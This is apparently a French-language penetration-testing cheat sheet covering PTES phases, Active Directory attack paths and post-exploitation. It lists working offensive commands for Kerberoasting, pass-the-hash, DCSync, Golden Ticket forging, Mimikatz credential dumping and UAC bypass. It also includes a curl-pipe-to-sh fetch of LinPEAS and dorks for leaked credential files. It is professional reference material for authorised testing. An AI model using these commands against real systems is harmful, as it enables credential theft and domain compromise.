# Méthodologies et chemins d'attaque — Référence

## Phases d'un test d'intrusion (PTES)
- **1. Reconnaissance passive :** OSINT, whois, subdomains (crt.sh), Google dorks, shodan/censys
- **2. Reconnaissance active :** nmap -sV -sC, ffuf, enumeration HTTP (headers, robots.txt, backup, .git)
- **3. Exploitation :** valider chaque vulnérabilité avec une preuve d'impact, rester dans la portée
- **4. Post-exploitation :** privesc, pivoting, persistence (SEULEMENT si dans le contrat), collecte de preuves
- **5. Reporting :** chaque finding = description + impact + reproduction + CVSS vectorisé + remédiation

## Active Directory — chemins d'attaque classiques
- **Kerberoasting :** demander un TGS pour un compte de service, cracker le hash hors-ligne
  - `GetUserSPNs.py domain/user:pass -dc-ip IP -request`
  - hashcat -m 13100 kerberoast.txt rockyou.txt
- **AS-REP Roasting :** comptes sans pré-auth Kerberos requise
  - `GetNPUsers.py domain/ -usersfile users.txt -dc-ip IP`
  - hashcat -m 18200 asrep.txt rockyou.txt
- **Pass-the-Hash :** utiliser le hash NTLM sans le casser
  - `psexec.py domain/user@target -hashes :NTLMHASH`
  - `crackmapexec smb 192.168.1.0/24 -u admin -H NTLMHASH`
- **Pass-the-Ticket :** réutiliser un ticket Kerberos volé
  - `psexec.py -k -no-pass domain/user@target`
- **DCSync :** répliquer les hashs depuis un DC (nécessite droits élevés)
  - `secretsdump.py domain/user:pass@DC -just-dc`
- **Delegations (constrained/unconstrained) :** abuser des comptes avec delegation
  - `findDelegation.py domain/user:pass -dc-ip IP`
  - `getST.py -impersonate admin domain/user:pass -spn cifs/target`
- **Golden Ticket :** forger un TGT avec le hash krbtgt (post-compromission totale)
  - `ticketer.py -nthash KRB_HASH -domain-sid SID -domain domain fakeadmin`
- **BloodHound :** cartographier les chemins d'élévation
  - `bloodhound-python -d domain -u user -p pass -ns IP -c All`

## Windows — post-exploitation (après accès)
- **Mimikatz :** `privilege::debug`, `sekurlsa::logonpasswords`, `lsadump::sam`
- **Token impersonation (msf) :** `getsystem`, `steal_token`
- **UAC bypass :** `fodhelper.exe`, `eventvwr.exe` (registry Key)
- **Sauvegarder les preuves :** captures, fichiers, hashes avec contexte (machine, date, commande)

## Linux — post-exploitation (après accès)
- LinPEAS : `curl -L https://github.com/peass-ng/PEASS-ng/releases/... linpeas.sh | sh`
- Chisel pour pivoter, ssh -L pour forwarder les ports
- Ne jamais modifier le système cible sans autorisation explicite (fichiers, binaires, comptes)

## Reporting — structure d'un finding pro
- **Titre :** action + objet (ex : "Injection SQL dans le paramètre id de /search.php")
- **Sévérité :** score CVSS 3.1 avec vecteur complet + justification
- **Description :** 2-3 phrases, contexte technique
- **Preuve :** requête + réponse, capture d'écran horodatée, commande reproductible
- **Impact :** ce qu'un attaquant peut réellement faire
- **Remédiation :** correction précise (code exemple si possible) + référence (OWASP/CWE)
- **Recommandation de priorité :** basée sur l'exposition réelle, pas seulement le CVSS brut

## Google dorks utiles (recon passive)
- site:target.com filetype:env
- site:target.com inurl:admin
- site:target.com ext:sql | ext:bak | ext:log
- "target.com" "password" filetype:xlsx
- inurl:php?id= site:target.com